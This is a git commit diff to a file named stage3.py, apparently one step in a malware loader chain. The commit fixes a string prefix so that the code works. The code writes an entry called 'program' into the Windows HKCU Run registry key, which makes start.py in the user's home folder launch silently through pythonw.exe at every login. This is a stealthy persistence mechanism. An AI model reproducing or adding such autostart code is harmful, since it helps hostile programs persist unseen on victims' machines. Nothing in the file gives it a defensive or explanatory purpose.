c3a897211a9c2a350dbf6d9b099eb2ad057b92ea
shift.0x7d8 <shift.0x7d8@ms.zzny.fun>
2025-04-01 11:51:44 -0400

    fix: string prefix

--- src/stage3.py
+++ src/stage3.py
@@ -5,6 +5,6 @@ from pathlib import Path as b
 p = f'"{sys.executable[0:-4]}w.exe"'
 s = fr' "{b.home()}\start.py"'
 
-k = winreg.OpenKey(winreg.HKEY_CURRENT_USER, winreg'Software\Microsoft\Windows\CurrentVersion\Run', 0, winreg.KEY_SET_VALUE)
+k = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r'Software\Microsoft\Windows\CurrentVersion\Run', 0, winreg.KEY_SET_VALUE)
 winreg.SetValueEx(k, 'program', 0, winreg.REG_SZ, p+s)
 winreg.CloseKey(k)
